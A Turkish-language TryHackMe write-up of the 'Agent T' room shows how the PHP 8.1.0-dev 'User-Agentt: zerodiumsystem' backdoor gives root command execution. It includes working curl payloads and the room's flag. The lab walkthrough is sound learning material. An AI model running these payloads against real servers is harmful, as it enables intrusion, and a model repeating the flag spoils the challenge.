# Agent T — TryHackMe

> PHP 8.1.0-dev'deki backdoor'u buldum. İsmi "zerodiumsystem" — bunu kim yazdıysa biraz ukala olmuş.

---

## İlk Bakış

```bash
nmap -sV <TARGET_IP>
```

Sadece 80 portu açık. Web sitesine girdim, sıradan bir admin dashboard şablonu. Ama bir şey dikkatimi çekti — sayfa çok hızlı yüklendi, sanki arkada bir şeyler dönüyor.

---

## Şüpheli Header

Burp Suite ile isteği yakaladım. Response header'larına baktım:

```
X-Powered-By: PHP/8.1.0-dev
```

Dur, dur. PHP 8.1.0-dev? Bu development sürümü, production'da ne işi var? Hemen Exploit-DB'ye baktım. Ve evet, bilinen bir RCE varmış.

---

## Backdoor Detayı

Exploit'in mantığı şu: `User-Agent` değil, `User-Agentt` (çift t). Yani geliştirici backdoor'u gizlemek için küçük bir yazım hatası yapmış — ama aslında bu "hata" bilerek konulmuş. Payload:

```
User-Agentt: zerodiumsystem('whoami')
```

`zerodiumsystem` fonksiyonu — Zerodium bir exploit satın alma platformu. Bu ismi kullanmak, sanki "bakın ne kadar değerli bir zafiyet buldum" demek gibi. Biraz havalı, biraz sinir bozucu.

---

## Exploit

cURL ile test ettim:

```bash
curl -H "User-Agentt: zerodiumsystem('id')" http://<TARGET_IP>/
```

Dönen response'ta `uid=0(root)` yazıyordu. Direkt root. Başka bir yere geçmeye falan gerek yok.

Sonra bayrağı aradım:

```bash
curl -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null')" http://<TARGET_IP>/
```

`/flag.txt` bulundu. İçeriği oku:

```bash
curl -H "User-Agentt: zerodiumsystem('cat /flag.txt')" http://<TARGET_IP>/
```

Ve işte:

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

## Ne Öğrendim?

- Development sürümleri production'da asla çalışmamalı. "Dev" diye etiketlenmiş bir şeyin arkasını düşün.
- Backdoor'lar bazen "gizli" değil, tam tersine isimleriyle ortada durur. `zerodiumsystem` gibi.
- Bu exploit 2021'de ortaya çıktı, hâlâ aktif CTF'lerde kullanılıyor. Eski zafiyetler ölmez, sadece unutulur.

---

> Yazan: Miraç | Tarih: Mayıs 2026
